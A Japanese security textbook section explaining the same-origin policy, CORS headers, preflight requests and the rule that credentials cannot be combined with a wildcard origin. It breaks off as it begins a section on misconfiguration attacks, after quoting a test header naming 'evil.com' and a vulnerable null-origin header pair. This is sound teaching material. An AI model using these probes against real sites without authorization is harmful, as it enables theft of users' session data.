# 同一オリジンポリシー（SOP）とCORS ― 定義・仕組み・設定ミス攻撃

> **この節で分かること**
> - オリジン（Origin）を scheme + host + port の3要素で判定できるようになり、2つのURLが同一オリジンか別オリジンかを自分で見分けられる。
> - 同一オリジンポリシー（SOP）が「送信・埋め込みは許すが読み取りは禁じる」という非対称な防御であることを説明できる。
> - CORS がSOPをサーバー側から緩める仕組みであること、シンプルリクエストとプリフライト（OPTIONS）の違いを説明できる。
> - `Access-Control-Allow-Origin` と `Access-Control-Allow-Credentials` の関係、`*` と資格情報が併用できない核心ルールを説明できる。
> - Origin反射・null origin信頼・安全でないサブドメインの信頼・正規表現ミス・内部ネットワークpivot という代表的なCORS設定ミスを、許可された検証環境で診断・実証できる。
> - 反射禁止・許可リスト完全一致・`Vary: Origin`・SameSite 考慮など、CORS脆弱性の防御と修正の要点を説明できる。

**元資料**: https://emrebener.medium.com/a-comprehensive-guide-to-the-same-origin-policy-and-the-cors-policy-4ca7535b0145 （原典は取得できず二次情報ベース）／ https://portswigger.net/web-security/cors （原典は取得できず、GitHub上の高忠実ミラーとMDN公式ドキュメントで補完）
**関連する節**: postMessage の脆弱性（クロスオリジン通信）、CSRF（クロスオリジン書き込み）、XSS（信頼オリジン上のスクリプト実行）

---

## 1. オリジンとは何か（scheme + host + port）

### 1-1. なぜオリジンという単位が必要か

ブラウザは、まったく無関係な多数のサイトのページを同時に開く。銀行のサイトと、たまたま開いた怪しい広告ページが、同じブラウザの中で同居している。もし一方のページのスクリプトが、もう一方のページのデータを自由に読めてしまえば、悪意あるサイトが銀行サイトの残高や個人情報を盗み放題になる。

そこでブラウザは「どこから来たコンテンツか」を **オリジン（Origin）** という単位で区切り、原則として別オリジン同士を隔離する。オリジンとは、リソースの出所を表す最小単位のこと。この隔離がなければ、Webは危険で使いものにならない。

### 1-2. オリジンは3要素で決まる

オリジンは URL の **スキーム（プロトコル）・ホスト（ドメイン）・ポート** の3要素で決まる。2つのURLが同一オリジンであるのは、この3要素すべてが一致するときだけである。1つでも違えば別オリジンになる。

- **スキーム（scheme）**とは、`http` や `https` のようなプロトコルのこと。
- **ホスト（host）**とは、`normal-website.com` のようなドメイン名のこと。
- **ポート（port）**とは、通信の入口となる番号のこと。`http` は既定で80番、`https` は既定で443番。

基準URLを `http://normal-website.com/example/` としたときに、各URLへのアクセスが同一オリジンとして許可されるかどうかを、PortSwigger の原文の表で示す。

| URL accessed                            | Access permitted?                  |
| --------------------------------------- | ---------------------------------- |
| http://normal-website.com/example/      | Yes: same scheme, domain, and port |
| http://normal-website.com/example2/     | Yes: same scheme, domain, and port |
| https://normal-website.com/example/     | No: different scheme and port      |
| http://en.normal-website.com/example/   | No: different domain               |
| http://www.normal-website.com/example/  | No: different domain               |
| http://normal-website.com:8080/example/ | No: different port                 |

この表から読み取るべき要点は次の4つである。

- **パスは無関係**。`/example/` と `/example2/` はパスが違うだけなので、同一オリジンである。オリジンの判定にパスは含まれない。
- **スキーム違いは別オリジン**。`http` から `https` への変化は別オリジン。しかも `https` の既定ポートは443、`http` は80なので、この行は「スキームとポートの両方が違う」と表現される。
- **サブドメイン違いは別オリジン**。`en.` や `www.` が付くとホスト（ドメイン）が違うので別オリジンになる。
- **ポート違いは別オリジン**。`:8080` を明示すると、既定の80番とは違うので別オリジンになる。

### 1-3. 別例で確認する（MDNの表）

同じ規則を、MDN 公式ドキュメントは別の基準URLで示している。基準URLを `http://store.company.com/dir/page.html` としたときの表を逐語で再現する。同じ規則が別の例でも成り立つことを確認できる。

| URL | Outcome | Reason |
| --- | --- | --- |
| `http://store.company.com/dir2/other.html` | Same origin | Only the path differs |
| `http://store.company.com/dir/inner/another.html` | Same origin | Only the path differs |
| `https://store.company.com/page.html` | Failure | Different protocol |
| `http://store.company.com:81/dir/page.html` | Failure | Different port (`http://` is port 80 by default) |
| `http://news.company.com/dir/page.html` | Failure | Different host |

MDN のオリジンの定義（逐語）は次のとおり。「Two URLs have the _same origin_ if the protocol, port (if specified), and host are the same for both.」つまりプロトコル・ポート・ホストの3つ組（tuple）が一致すれば同一オリジンである。

### 1-4. 特殊なオリジンと「サイト」との違い

〔補足〕Internet Explorer は歴史的に「ポートを無視する」「同一ゾーン間ではSOPを緩める」という非標準の挙動を持っていたが、現代の主要ブラウザ（Chrome / Firefox / Safari / Edge）はスキーム＋ホスト＋ポートで厳密に判定する。`file://` スキームや `data:` / `blob:` スキームは特別扱いされ、多くの場合 **不透明オリジン（opaque origin）= `Origin: null`** として扱われる。この null origin は、後述の攻撃の温床になる。

もう1つ、混同しやすいのが「オリジン（Origin）」と「サイト（Site）」の違いである。**サイト（Site）とは、scheme + eTLD+1（登録可能ドメイン）で決まる、オリジンより広い単位のこと**。たとえば `https://a.example.com` と `https://b.example.com` は「別オリジンだが同一サイト（same-site）」である。SameSite Cookie やサイト分離（Site Isolation）はこの「サイト」単位で働き、CORS / SOP は「オリジン」単位で働く。両者は違う粒度なので混同しないこと。

> ### 📌 ここは自分で開いて読んでください
> **資料**: A Comprehensive Guide to the Same-Origin Policy and the CORS Policy（emrebener, Medium） — https://emrebener.medium.com/a-comprehensive-guide-to-the-same-origin-policy-and-the-cors-policy-4ca7535b0145
> **なぜ**: 本教科書の執筆環境からは自動取得できなかった（理由: Medium 系ドメインが egress プロキシで全面遮断され、`freedium.cfd` / `scribe.rip` / `archive.ph` / `web.archive.org` の代替ミラーもすべて403、WebSearch も予算枯渇で使えなかった）。この節のSOP/CORSの概念解説は、同一テーマを扱うMDN公式ドキュメントとPortSwiggerのミラーにもとづく要約であり、この記事固有の文章・図解は含んでいない。
> **読みどころ**:
> 1. SOPの定義とオリジン3要素（scheme / host / port）の基本解説。本節1と突き合わせる。
> 2. SOPが「読み取りだけ禁じ、埋め込み・送信は許す」非対称性の説明と具体例（画像canvas汚染、iframe DOMアクセス禁止など）。本節2と対応。
> 3. CORSの動作フロー（simple request と preflight OPTIONS）の図解。著者独自の図や言い回しがあれば拾う。
> 4. `Access-Control-Allow-Credentials` とワイルドカードの相互排他という核心ルールを著者の言葉で再確認。
> 5. `document.domain` などレガシー緩和への言及の位置づけ。
> **代替手段**: MDN「Same-origin policy」 https://developer.mozilla.org/en-US/docs/Web/Security/Defenses/Same-origin_policy 、MDN「CORS」 https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS 、MDN 用語集「Origin」 https://developer.mozilla.org/en-US/docs/Glossary/Origin （いずれも無料・権威ある一次相当資料で、本節はこれらで裏付けている）。

---

## 2. 同一オリジンポリシー（SOP）が禁じるもの・許すもの

### 2-1. SOPの核心 ― 読み取りだけを止める

**同一オリジンポリシー（Same-Origin Policy, SOP）とは、あるオリジンで読み込まれた文書やスクリプトが、別オリジンのリソースとどう相互作用できるかを制限する、ブラウザの中心的な防御機構のこと**。

MDN の定義（逐語）は次のとおり。

```
The same-origin policy is a critical security mechanism that restricts how a document or script loaded by one origin can interact with a resource from another origin. It helps isolate potentially malicious documents, reducing possible attack vectors. For example, it prevents a malicious website on the Internet from running JS in a browser to read data from a third-party webmail service (which the user is signed into) or a company intranet (which is protected from direct access by the attacker by not having a public IP address) and relaying that data to the attacker.
```

要するに、悪意あるサイトが、ユーザーがログイン済みのWebメールや、公開IPを持たない社内イントラのデータを読み取り、攻撃者に転送するのを防ぐのがSOPである。

**SOPの核心は「クロスオリジンの書き込み・埋め込みは許すが、レスポンスの読み取り（read）を禁じる」という点にある。** ここが一番大事なので、次の3分類で整理する。

### 2-2. write / embed / read の3分類（MDN逐語）

MDN はクロスオリジンのネットワークアクセスを3種類に分ける。逐語は次のとおり。

```
• Cross-origin writes are typically allowed. Examples are links, redirects, and form submissions. Some HTTP requests require preflight.
• Cross-origin embedding is typically allowed. (Examples are listed below.)
• Cross-origin reads are typically disallowed, but read access is often leaked by embedding. For example, you can read the dimensions of an embedded image, the actions of an embedded script, or the availability of an embedded resource.
```

これを噛み砕くと次のようになる。

- **クロスオリジンの書き込み・送信（writes）: 通常許可される。** リンク遷移、リダイレクト、フォーム送信（`<form>` の POST）などは、別オリジンへ送れる。これが CSRF（クロスサイトリクエストフォージェリ）が成立する理由でもある。一部のリクエストはプリフライトを要する。
- **クロスオリジンの埋め込み（embedding）: 通常許可される。** `<script src>`、`<img src>`、`<link rel=stylesheet>`、`<iframe>`、`<video>`、`@font-face`、`<object>` などで、別オリジンのリソースを読み込める。**ただし埋め込めても「JavaScriptから中身を読む」ことはできない。** たとえば別オリジンの画像を `<canvas>` に描くと、その canvas は「汚染された（tainted）」状態になり、`getImageData` が失敗する。
- **クロスオリジンの読み取り（reads）: 通常禁止される。** `fetch` / `XMLHttpRequest` で別オリジンにリクエストを送ること自体は許可される（送信は許可）が、**そのレスポンス本文をスクリプトが読むことは、CORSで明示的に許可されない限り禁止**される。別オリジンの iframe の `document`（DOM）へのアクセスも禁止される。

### 2-3. 「送信はできるが読み取りだけ止める」非対称性がなぜ危ないか

ここで重要なのは、「リクエストは飛ぶが、レスポンスを読めない」という非対称性である。ネットワーク上ではリクエストが実際に標的サーバーに到達し、`withCredentials` を付ければ Cookie も一緒に送られる。だがブラウザは、そのレスポンスをJavaScriptに見せる直前でブロックする。

**この『送信はできる／読み取りだけ止める』という非対称性が、CORS設定ミスの危険度を決める。** もしサーバーの設定ミスで、資格情報（Cookie）付きのレスポンスを攻撃者オリジンから読めてしまうと、被害者のログイン状態のまま機密データ（APIキーやアカウント情報）を盗めてしまう。これはアカウント乗っ取り級の被害になる。

さらに MDN が指摘する重要な洞察がある。読み取りは原則禁止だが、**埋め込みを通じてしばしば漏れる**。埋め込んだ画像の**寸法（dimensions）**は読める、埋め込みスクリプトの**動作**は観測できる、埋め込みリソースの**存在の有無**は判定できる。これらは直接データを読むわけではないが、サイドチャネルとして情報を漏らす。この性質が XS-Leaks（クロスサイトリーク）系攻撃の土台になる。

### 2-4. 埋め込み可能なリソースと防御の粒度

MDN が挙げるクロスオリジン埋め込み可能なリソースは次のとおり（逐語要約）。`<script src>`（構文エラーの詳細は同一オリジンのみ読める）、`<link rel=stylesheet>`（**正しい `Content-Type` が必要**で、MIMEが不正だとブロックされる）、`<img>`、`<video>` / `<audio>`、`<object>` / `<embed>`、`@font-face`（ブラウザにより同一オリジンを要求する）、`<iframe>`（`X-Frame-Options` でフレーム化を拒否できる）。

MDN が示すクロスオリジンアクセスを防ぐ方法は、後述の防御（第12小節）を先取りして押さえておくとよい。

- **書き込みを防ぐ**: リクエストの中に推測不能なトークン（CSRFトークン）を入れて検証する。そのトークンを要するページの**読み取り**も防ぐこと。
- **読み取りを防ぐ**: リソースを埋め込み不可にする（埋め込みは常に何らかの情報を漏らすため）。
- **埋め込みを防ぐ**: リソースが埋め込み可能なフォーマットとして解釈されないようにする。**ブラウザは `Content-Type` を尊重しないことがある**。たとえば `<script>` にHTMLを指すと、ブラウザはそのHTMLをJavaScriptとして解釈しようとする。

---

## 3. SOPの例外とクロスオリジンで許されるプロパティ

### 3-1. SOPには例外がある（six2dez 逐語）

SOPは「読み取り禁止」が基本だが、いくつか例外がある。PortSwigger のミラーには、その例外リストが逐語で載っている。

```
# There are various exceptions to the same-origin policy:
• Some objects are writable but not readable cross-domain, such as the location object or the location.href property from iframes or new windows.
• Some objects are readable but not writable cross-domain, such as the length property of the window object (which stores the number of frames being used on the page) and the closed property.
• The replace function can generally be called cross-domain on the location object.
• You can call certain functions cross-domain. For example, you can call the functions close, blur and focus on a new window. The postMessage function can also be called on iframes and new windows in order to send messages from one domain to another.
```

日本語で読み解くと次のとおり。

- **`location` オブジェクト / `location.href`** は、iframe や新規ウィンドウに対して**クロスドメインで「書ける」が「読めない」**。つまり別オリジンのフレームを別URLへ飛ばす（ナビゲートする）ことはできるが、そのフレームの現在のURLを読むことはできない。
- **`window.length`**（そのページが持つフレーム数）と **`closed` プロパティ**は、**クロスドメインで「読める」が「書けない」**。フレーム数の数え上げなどサイドチャネルに悪用されうる。
- **`location` の `replace` 関数**は、概ねクロスドメインで呼べる。
- 特定の関数はクロスドメインで呼べる。例として新規ウィンドウに対する **`close` / `blur` / `focus`**。そして **`postMessage`** も iframe・新規ウィンドウに対して呼べ、ドメイン間のメッセージ送信に使う。この `postMessage` は別の節で扱うpostMessage脆弱性へつながる。

### 3-2. クロスオリジンで許される Window / Location の権威表（MDN）

上の箇条書きを、MDN の正式なプロパティ表で厳密化できる。クロスオリジンでも許可されるアクセスは以下に限られる。仕様上は HTML Living Standard の Cross-origin objects 節に規定されている。

`Window` のメソッド（クロスオリジンで**呼べる**）: `window.blur` / `window.close` / `window.focus` / `window.postMessage`

`Window` の属性は次のとおり。

| 属性 | クロスオリジン可否 |
| --- | --- |
| `window.closed` | Read only（読めるが書けない） |
| `window.frames` | Read only |
| `window.length` | Read only |
| `window.location` | **Read/Write** |
| `window.opener` | Read only |
| `window.parent` | Read only |
| `window.self` | Read only |
| `window.top` | Read only |
| `window.window` | Read only |

`Location` のメソッド（クロスオリジンで呼べる）: `location.replace`
`Location` の属性: `location.href` → **Write-only（書けるが読めない）**

この表を見ると、`window.location` だけが唯一 Read/Write 両方許可されており、`location.href` は Write-only という粒度まで確認できる。six2dez の箇条書きと完全に整合する。文書間で安全に通信したいときは、MDN 公式が推奨するとおり **`window.postMessage` を使う**のが正しい。

---

## 4. document.domain というレガシー緩和（非推奨）

### 4-1. どう動くのか

**`document.domain` とは、同一の上位ドメインを共有するページ同士が、DOMアクセスを許し合うための歴史的なSOP緩和機構のこと**。`a.example.com` と `b.example.com` の両方のページが、それぞれ `document.domain = "example.com"` と設定すると、本来別オリジンであるこの2ページの間でDOMアクセスが可能になる。

- 設定できるのは**現在のドメイン、またはその上位（親）ドメイン**のみ。`example.com` のページが `com` に設定することはできず、`evil.com` に設定することもできない。`company.com` から `othercompany.com` にはできない（上位ドメインでないため）。
- **ポート番号の扱いに注意**が要る。MDN によれば、ポート番号は別途チェックされ、`document.domain = document.domain` を含む**あらゆる `document.domain` 代入はポート番号を `null` に上書きする**。つまり `company.com:8080` と `company.com` を通話させるには、両者で `document.domain` を設定して両方の port を null にそろえる必要がある。
- 親子で使う場合は**双方で同じ値**に設定する必要がある。片方が元の値のままでは通話できない。

### 4-2. 攻撃者はどこを突くか

`document.domain` のセキュリティ上のリスクは、**信頼の連鎖が広がりすぎる**点にある。あるサブドメインがXSSなどで侵害されると、`document.domain` を共有する他のサブドメインまで巻き込まれる。共有ホスティング上で第三者のサイトと同じ上位ドメインを共有していると、その第三者のページから自分のページのDOMに手を出される危険がある。

### 4-3. なぜ使ってはいけないか（MDN公式の警告）

MDN は `document.domain` を明確に**非推奨（deprecated）**としている。公式の警告（逐語）は次のとおり。

```
The approach described here (using the document.domain setter) is deprecated because it undermines the security protections provided by the same origin policy, and complicates the origin model in browsers, leading to interoperability problems and security bugs.
```

つまり `document.domain` の setter は、SOPの防御を弱め、ブラウザのオリジンモデルを複雑にし、相互運用性の問題やセキュリティバグを招くため非推奨とされている。

補足すると、**sandbox iframe 内で `document.domain` を設定すると `SecurityError` の DOMException になる**。また `localStorage` / `indexedDB` / `BroadcastChannel` / `SharedWorker` など多くの Web API のオリジンチェックには `document.domain` は影響しない（これらは緩和を無視する）。教科書としては「レガシーな緩和であり使うべきでない。文書間通信には `postMessage` か CORS を使う」と位置づけるのが正しい。

---

## 5. CORS ― SOPをサーバー側から緩める仕組み

### 5-1. なぜCORSが必要か

SOPは安全側に倒した既定なので、「クロスオリジンの読み取りは全部禁止」である。しかし現実には、`api.example.com` が返すデータを `www.example.com` のスクリプトから読みたい、という正当な要求がある。この正当な緩和のために用意されたのが CORS である。

**CORS（Cross-Origin Resource Sharing, オリジン間リソース共有）とは、SOPで既定禁止されている「クロスオリジンの読み取り」を、リソース側のサーバーがHTTPレスポンスヘッダで明示的に許可する標準のこと**。W3C / WHATWG の Fetch 仕様に定義されている。ブラウザはこのヘッダを見て、レスポンスをJavaScriptに開示してよいかを判断する。

CORSの基本動作について、PortSwigger のミラーは `Access-Control-Allow-Origin` を次のように説明する（逐語）。

```
# Access-Control-Allow-Origin header is included in the response from one website to a request originating from another website, and identifies the permitted origin of the request. A web browser compares the Access-Control-Allow-Origin with the requesting website's origin and permits access to the response if they match.
```

要するに `Access-Control-Allow-Origin`（略してACAO）は、レスポンスに含まれ「読み取りを許す送信元オリジン」を指定する。ブラウザはACAOと実際の要求元オリジンを比較し、一致すればレスポンスへのアクセスを許可する。

> ### 📌 ここは自分で開いて読んでください
> **資料**: Cross-origin resource sharing (CORS)（PortSwigger Web Security Academy） — https://portswigger.net/web-security/cors
> **なぜ**: 本教科書の執筆環境からは自動取得できなかった（理由: portswigger.net も egress プロキシで403遮断）。ただし内容は `six2dez/pentest-book` と `swisskyrepo/PayloadsAllTheThings` のGitHubミラーにオリジン比較表・SOP例外リスト・4ラボ全解法が逐語で転載されており、本節はそれとMDN公式ドキュメントで高忠実に再現している。以下は二次ミラーと公式ドキュメントにもとづく要約である。
> **読みどころ**:
> 1. CORSトピックの本文構成（What is CORS / Same-origin policy / Relaxation with CORS / Vulnerabilities arising from CORS / How to prevent）の原文の言い回し。
> 2. 各ラボの公式難易度表示と最新の解法手順。特にラボ④ internal network pivot の最新版（PortSwiggerはラボを更新することがある）。
> 3. `Access-Control-Max-Age` / `Access-Control-Expose-Headers` / プリフライトの公式説明を、本節の記述と照合する。
> 4. 関連する「Exploiting CORS misconfigurations for Bitcoins and bounties」（James Kettle）ブログへのリンク（実戦事例の一次情報）。
> 5. Burp Suite（Repeater / Collaborator / exploit server）を使った公式の検証フロー。
> **代替手段**: 仕様・概念の権威ある一次資料としてMDN CORS https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS 、MDN SOP https://developer.mozilla.org/en-US/docs/Web/Security/Defenses/Same-origin_policy 、さらに厳密な規範定義はWHATWG Fetch仕様 https://fetch.spec.whatwg.org/#http-cors-protocol とHTML Living Standard § Cross-origin objects https://html.spec.whatwg.org/multipage/browsers.html#cross-origin-objects を参照。

### 5-2. シンプルリクエスト（simple request / プリフライトなし）

CORSのリクエストには2種類ある。1つが**シンプルリクエスト**である。以下の条件を**すべて**満たすと「シンプルリクエスト」とみなされ、ブラウザは事前確認（プリフライト）なしに直接リクエストを送る。

MDN の完全な条件（逐語要約）は次のとおり。

1. メソッドが `GET` / `HEAD` / `POST` のいずれか。
2. UA（ブラウザ）が自動設定するヘッダ以外で手動設定できるのは、**CORS-safelisted request-headers** のみ。具体的には `Accept` / `Accept-Language` / `Content-Language` / `Content-Type`（下記の制限つき） / `Range`（**単一のrange値のみ**。例 `bytes=256-`）。
3. `Content-Type` は `application/x-www-form-urlencoded` / `multipart/form-data` / `text/plain` のいずれかのみ。`application/json` はここに含まれないため、JSONを送るとシンプルにならずプリフライトが発生する。
4. `XMLHttpRequest` を使う場合、`xhr.upload` に**イベントリスナが登録されていない**こと（`xhr.upload.addEventListener()` を呼んでいたら非シンプル）。
5. リクエストに **`ReadableStream` オブジェクトを使っていない**こと。

**CORS-safelisted request headers（CORSセーフリスト済みリクエストヘッダ）とは、フォーム送信で自然に付くような、プリフライトなしで送っても安全と見なされる少数のヘッダのこと**。

MDN が示す重要な前提がある（逐語要約）。シンプルリクエストという概念は、HTML 4.0 の `<form>` がすでに任意オリジンへシンプルなリクエストを送れた歴史に由来する。だから**サーバは元々CSRF対策を実装しているはず**という前提のもと、フォーム送信相当のリクエストはプリフライト（サーバのopt-in）なしに送れる。ただし、**そのレスポンスをスクリプトと共有する**には、サーバが `Access-Control-Allow-Origin` でopt-inする必要がある。

シンプルリクエストでは、ブラウザが自動で `Origin` ヘッダを付ける。サーバーがACAOを返し、それが要求元オリジンに一致すればJSがレスポンスを読める。

### 5-3. プリフライト（preflight）リクエスト

シンプルの条件を満たさない場合（例: `PUT` / `DELETE` / `PATCH`、`Content-Type: application/json`、`Authorization` や独自ヘッダ `X-...` を付けるなど）、ブラウザは本リクエストの前に **`OPTIONS` メソッドのプリフライトリクエスト**を自動で送信し、「本当に送っていいか」をサーバーに確認する。

**プリフライト（preflight）とは、本番リクエストを送る前に、ブラウザがサーバーに許可を問い合わせる事前確認のリクエストのこと**。`OPTIONS` メソッドで送られる。

プリフライトでブラウザが送る要求ヘッダは次のとおり。

- `Origin: <要求元>`
- `Access-Control-Request-Method: <本リクエストのメソッド>`
- `Access-Control-Request-Headers: <本リクエストが付ける非safelistヘッダのリスト>`

サーバーがプリフライトに返す応答ヘッダは次のとおり。

- `Access-Control-Allow-Origin`（ACAO） ― 許可オリジン
- `Access-Control-Allow-Methods`（ACAM） ― 許可メソッド（例: `GET, POST, PUT, OPTIONS`）
- `Access-Control-Allow-Headers`（ACAH） ― 許可する要求ヘッダ
- `Access-Control-Allow-Credentials`（ACAC） ― 資格情報付きの可否（`true` かなし）
- `Access-Control-Max-Age`（例: `Access-Control-Max-Age: 86400`） ― プリフライト結果をブラウザがキャッシュしてよい秒数。大きいと再プリフライトを省ける。
- `Access-Control-Expose-Headers` ― JSに公開する**レスポンス**ヘッダ名の許可リスト（既定ではセーフリストのレスポンスヘッダしか読めない）。

プリフライトが許可を返した後、ブラウザは本リクエストを送信する。そのレスポンスにもACAO（と必要なら `Access-Control-Allow-Credentials`）が付いて、初めてJSがそのレスポンスを読める。

### 5-4. プリフライトの完全なやり取り（MDN実例逐語）

MDN のプリフライト実例を見ると、やり取りが具体的に分かる。`POST` + `Content-Type: text/xml` + 独自ヘッダ `X-PINGOTHER` を付けたリクエストがプリフライトを発生させる。プリフライトの要求と応答（逐語）は次のとおり。

```http
OPTIONS /doc HTTP/1.1
Host: bar.other
Origin: https://foo.example
Access-Control-Request-Method: POST
Access-Control-Request-Headers: content-type,x-pingother

HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://foo.example
Access-Control-Allow-Methods: POST, GET, OPTIONS
Access-Control-Allow-Headers: X-PINGOTHER, Content-Type
Access-Control-Max-Age: 86400
Vary: Accept-Encoding, Origin
```

MDN が明確化しているポイントは次のとおり（逐語要約）。

- `Access-Control-Request-Method` は本リクエストで使うメソッドをサーバに予告する。`Access-Control-Request-Headers` は本リクエストで付ける非セーフリストヘッダを予告する。
- `OPTIONS` は**safe method**（リソースを変更しないメソッド）である。
- **`Access-Control-Max-Age` の既定値は5秒**。ブラウザごとに上限があり、`Max-Age` がその上限を超えると上限が優先される。例の `86400` は24時間。
- **本リクエスト（実際のPOST）には `Access-Control-Request-*` ヘッダは含まれない**。これらはプリフライトのOPTIONSにのみ必要である。

〔補足〕プリフライトとリダイレクトの実務知識も押さえておくとよい（MDN逐語要約）。一部のブラウザは、プリフライト後のリダイレクト追従を未サポートで、「The request was redirected to ..., which is disallowed for cross-origin requests that require preflight.」というエラーになる。仕様は当初これを要求していたが後に不要へ変わり、未実装のブラウザが残る。回避策は「プリフライトやリダイレクトを避けるようサーバを変更する」「シンプルリクエスト化する」、または「先にシンプルリクエストで最終URL（`Response.url` / `XMLHttpRequest.responseURL`）を得てから本リクエストを投げる」。ただし **`Authorization` ヘッダ由来のプリフライトはこの回避が効かない**。

---

## 6. 資格情報（credentials）とワイルドカードの排他ルール ★最重要

### 6-1. なぜこのルールが攻撃の分かれ目か

CORS脆弱性を理解する上での中心となるのが、**資格情報（Cookieなど）とワイルドカード `*` の排他ルール**である。**資格情報（credentials）とは、Cookieや `Authorization` ヘッダなど、ユーザーのログイン状態を表す情報のこと**。ここを正確に押さえると、どのCORS設定が本当に危険かを判断できるようになる。

規則を4つに整理する（PortSwigger CORSラボの walk-through で実証される規則を日本語化したもの）。

1. **Cookie・認証情報を伴うクロスオリジン読み取りには `Access-Control-Allow-Credentials: true` が必要**。かつクライアント側で `xhr.withCredentials = true`（または `fetch(url, {credentials:'include'})`）を指定する必要がある。
2. **`Access-Control-Allow-Credentials: true` のとき、`Access-Control-Allow-Origin` にワイルドカード `*` は使えない**。ブラウザは「`*` + 資格情報」の組み合わせを拒否し、Cookieを一切送らず、読ませもしない。したがって資格情報付きで機密を読むには、サーバーは**具体的なオリジン**（またはリクエストのOriginを反射した値、または `null`）を返す必要がある。
3. **`Access-Control-Allow-Origin: *`（ワイルドカード）のとき、ブラウザは決してCookieを送らない**。認証不要な内部/公開データにしか意味がない。ただし内部ネットワークのサーバーだと認証なしで読めてしまい、pivot に悪用される（後述）。
4. **`Access-Control-Allow-Origin: null` は資格情報付きでも許可される**。これが null origin 攻撃が成立する技術的理由である。

### 6-2. PortSwigger の逐語ポイント

PortSwigger の null-origin ラボの walk-through は、この規則を次のように述べている（逐語）。

```
Another problem with CORS can be wildcard origin, which is allowing any domain to access the response. However, browsers will never send cookies if wildcard origins are used, regardless of the content of the Access-Control-Allow-Credentials header.
```

```
Similar to wildcard origin, a null origin is another way to allow the whole world to access the resources on websites. But unlike wildcard origin, null origin allows access to the response if the Access-Control-Allow-Credentials header is set to true.
```

そして、攻撃者にとって「おいしい」脆弱な組み合わせの応答ヘッダ（逐語）は次のとおり。

```
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

### 6-3. MDN公式による裏付け

MDN の「Credentialed requests and wildcards」も、この核心を明文で裏付ける（逐語要約）。資格情報付きのレスポンスで、サーバは `*` ワイルドカードを**使ってはならない**。具体的な値が必要になる。

- `Access-Control-Allow-Origin` に `*` 不可 → 明示オリジン（例 `https://example.com`）。
- `Access-Control-Allow-Headers` に `*` 不可 → 明示ヘッダ名リスト。
- `Access-Control-Allow-Methods` に `*` 不可 → 明示メソッド名リスト。
- `Access-Control-Expose-Headers` に `*` 不可 → 明示ヘッダ名リスト。

MDN の逐語による帰結は次のとおり。

```
If a request includes a credential (most commonly a Cookie header) and the response includes an Access-Control-Allow-Origin: * header (that is, with the wildcard), the browser will block access to the response, and report a CORS error in the devtools console.
```

```
But if a request does include a credential (like the Cookie header) and the response includes an actual origin rather than the wildcard (like, for example, Access-Control-Allow-Origin: https://example.com), then the browser will allow access to the response from the specified origin.
```

さらにMDNは、`Access-Control-Allow-Origin` が `*`（実オリジンでない）だと、レスポンスの `Set-Cookie` は**Cookieを設定しない**と述べる（逐語要約）。

**プリフライトと資格情報の関係**も重要である。MDN の逐語は「CORS-preflight requests **must never include credentials**. The response to a preflight request must specify `Access-Control-Allow-Credentials: true` to indicate that the actual request can be made with credentials.」。つまりプリフライト（OPTIONS）自体にはCookieが乗らないが、その応答に `Access-Control-Allow-Credentials: true` があって初めて、本リクエストを資格情報付きで送れる。

---

## 7. Vary: Origin とキャッシュ、null origin の発生源

### 7-1. Vary: Origin ― なぜ付けないと危ないか

サーバーがOriginごとに異なるACAOを返す（＝Originを反射する）場合、**`Vary: Origin` レスポンスヘッダを必ず付ける**べきである。**`Vary: Origin` とは、「この応答は Origin ヘッダの値によって変わる」とキャッシュに伝えるヘッダのこと**。

これを付けないと何が起きるか。CDN・ブラウザ・プロキシのHTTPキャッシュが、「あるオリジン向けに `Access-Control-Allow-Origin: https://good.com` を含む応答」を、別オリジンからの要求にも使い回してしまう。結果として、**キャッシュ汚染（cache poisoning）経由でCORSポリシーが崩れる**、あるいは逆に正当なオリジンにACAOが届かず機能が壊れる、という問題が起きる。動的にACAOを生成するなら `Vary: Origin` は必須である。MDN も、動的に単一オリジンを返すなら `Vary: Origin` を付けるべきと明記している。

### 7-2. null origin はどこから発生するか

`Origin: null` がブラウザから送られる主なケースは次のとおり（PortSwigger のラボ walk-through は StackOverflow の一覧を参照しているが、一般に知られた発生源は以下）。

- **サンドボックス化された iframe**（`sandbox` 属性付きで、`allow-same-origin` を含めない場合）内のスクリプトからのリクエスト。
- **`data:` URI スキーム**（`src="data:text/html,..."`）から実行されたドキュメント。
- **`file://` スキーム**のローカルファイルからのリクエスト。
- クロスオリジンの**リダイレクト**を経たリクエスト。
- 〔補足〕`srcdoc` iframe や、Refererを抑止する `<meta name="referrer">` の一部設定など。

攻撃者はこれを利用する。**攻撃者が制御する iframe / data URI から `Origin: null` のリクエストを発生させれば**、サーバーが「null を信頼」している場合に、資格情報付きで機密を読める。

### 7-3. opaque origin の正体（MDN）

なぜ null origin がこれほど扱いにくいのか。MDN の **opaque origin（不透明オリジン）** の定義がその核心を突いている（逐語）。

```
An opaque origin is a special type of browser-internal value that obscures the true origin of a resource (opaque origins are always serialized as `null`). They are used by the browser to ensure resource isolation as they are never considered equal to any other origin — including other opaque origins.
```

つまり opaque origin は、**常に `null` にシリアライズされ、他のどのオリジン（他の opaque origin さえ含む）とも決して等しくならない**。本来これは隔離のための仕組みだが、サーバーが素朴に `null` を許可リストに入れてしまうと、その「決して等しくならないはずの null」を攻撃者が自作できてしまう。

MDN が挙げる opaque origin の代表ケース（逐語要約）は、`sandbox` 属性付きで `allow-same-origin` を含まない iframe 内のドキュメント、`file:` URL（通常opaque扱いでファイル同士が読み合えない）、`DOMImplementation.createDocument()` 等でプログラム生成したドキュメント、である。

補足として MDN は継承オリジン（inherited origins）にも触れる。`about:blank` や `javascript:` URL から実行されたスクリプトは、**それを含む文書のオリジンを継承**する。一方 **`data:` URL は新しい空のセキュリティコンテキスト（= opaque / null）を得る**。ここが「data URI から null origin を作れる」根拠である。fileオリジンは実装依存で、過去に脆弱性の原因になったこともある（Mozilla MFSA2019-21 / CVE-2019-11730）。

---

## 8. CORS設定ミスの攻撃パターン（診断・防御目的の解説）

> 前提: 以下はすべて**許可された診断・バグバウンティ・自分で立てた検証環境**での技術解説である。標的は機密を返すAPIエンドポイント（例: `/accountDetails`, `/endpoint`）で、ゴールは「被害者のセッションで機密（APIキー等）を攻撃者サーバーに送らせられるか」を実証し、それを塞ぐことにある。攻撃コードは必ず防御と対で理解すること。

### 8-1. 悪用の必要条件と最初のテスト

攻撃が成立するための必要条件を、PayloadsAllTheThings は次のように整理している（逐語）。

```
* BURP HEADER> `Origin: https://evil.com`
